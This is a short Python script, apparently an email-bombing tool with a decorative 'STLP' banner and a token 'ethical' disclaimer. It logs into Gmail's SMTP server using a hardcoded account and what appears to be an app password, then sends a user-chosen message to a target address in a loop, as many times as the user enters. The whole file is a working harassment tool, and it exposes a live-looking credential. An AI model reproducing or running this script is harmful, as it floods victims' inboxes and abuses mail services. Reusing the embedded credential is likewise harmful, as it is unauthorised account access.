


import os
import sys
import time


os.system("clear")

print("\n\n\n")
name=input(" \033[1;32m Please enter your name : ")	

os.system("clear")



def style(a):
	for x in a :
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.05)
		
		
		
style("\t \t  Loading.........")
	
print("\n\n\n")

time.sleep(1.3)

os.system("clear")


style("\t\t  Loading success")


os.system("clear")

print("\n\n")




style(" \033[1;31m Hey " + "\033[1;33m" + name +" \033[1;31m, Use for ethical perpos only ")






time.sleep(2)
os.system("clear")

print(""" \033[1;32m




███████╗████████╗██╗     ██████╗ 
██╔════╝╚══██╔══╝██║     ██╔══██╗
███████╗   ██║   ██║     ██████╔╝
╚════██║   ██║   ██║     ██╔═══╝ 
███████║   ██║   ███████╗██║     
╚══════╝   ╚═╝   ╚══════╝╚═╝     
    
\033[1;36m ==============================

 Creator : Md Mynul Islam
 Github  : mynul367
 facebook: Md Mynul Islam 
 
==============================
 
     
     
\033[1;0m  
     """)











import smtplib

server=smtplib.SMTP("smtp.gmail.com","587")

server.ehlo()
server.starttls()


server.login("alom013365@gmail.com","ntqiujpwsliwhxbx")



x=1
target=input("Enter target mail :")
am=int(input("Input amout : "))
s=input("Enter mail subject : ")
m=input("Enter your message : ")

while x<=am:
	


	
	
	
	
	msg=(f"Subject:{s} \n\n {m}")
	
	server.sendmail("limon88764@gmail.com",target,msg)
	
	print(f"{x}, Mail sent success ")
	x=x+1